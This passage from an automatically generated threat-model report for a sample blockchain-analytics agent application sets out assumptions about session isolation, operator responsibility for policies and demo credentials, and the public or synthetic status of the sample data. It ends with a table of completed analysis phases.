**Description**: Each analyst session uses a fresh, unguessable runtimeSessionId, as the shipped UI and eval runner do, and one AgentCore session serves exactly one principal.

- **Impact**: Load-bearing for the module-level active-role slot and the per-session engine/result state. A reused id across identities is caught by the session-owner binding and reset (T003); lifting the module into a multi-principal service voids these conclusions (T025).
- **Rationale**: AgentCore documents that the session id is caller-provided and isolation is between sessions; the app binds retained state to an owner within the microVM.

### A009: Operational responsibility

**Description**: The operator/deployer owns the account, the data, the governance policy content, and the Cognito user lifecycle (including rotating documented demo passwords before any shared exposure). They are not modelled as an adversary; their misconfiguration is in scope.

- **Impact**: Policy-authoring errors and unrotated demo credentials are operator risks (T011, T026). Shape errors fail closed at import; omission fails closed via deny-by-default; a semantically over-broad policy still governs as written.
- **Rationale**: A sample cannot enforce operational hygiene in the consumer's account; validation + deny-by-default + documentation are the available controls.

### A010: Data sensitivity

**Description**: Sample data is public (aws-public-blockchain, public OFAC list) or synthetic (cex_deposit_labels incl. subject_identity), or the deployer's own cloud telemetry; no real third-party customer data ships with the sample.

- **Impact**: Caps the immediate harm of the disclosure threats for the published sample. A deployer substituting real KYC linkage or another organisation's data inherits the documented residuals (notably T009, T023).
- **Rationale**: The repo ships loaders and views but no third-party data; the labels are synthetic and the OFAC list is public; a not-for-production disclaimer covers substitution.

## Phase Progress

| Phase | Name | Completion |
|---|---|---|
| 1 | Business Context Analysis | 100% ✅ |
| 2 | Architecture Analysis | 100% ✅ |
| 3 | Threat Actor Analysis | 100% ✅ |
| 4 | Trust Boundary Analysis | 100% ✅ |
| 5 | Asset Flow Analysis | 100% ✅ |
| 6 | Threat Identification | 100% ✅ |
| 7 | Mitigation Planning | 100% ✅ |
| 7.5 | Code Validation Analysis | 100% ✅ |
| 8 | Residual Risk Analysis | 100% ✅ |
| 9 | Output Generation and Documentation | 100% ✅ |

---

*This threat model report was generated automatically by the Threat Modeling MCP Server.*
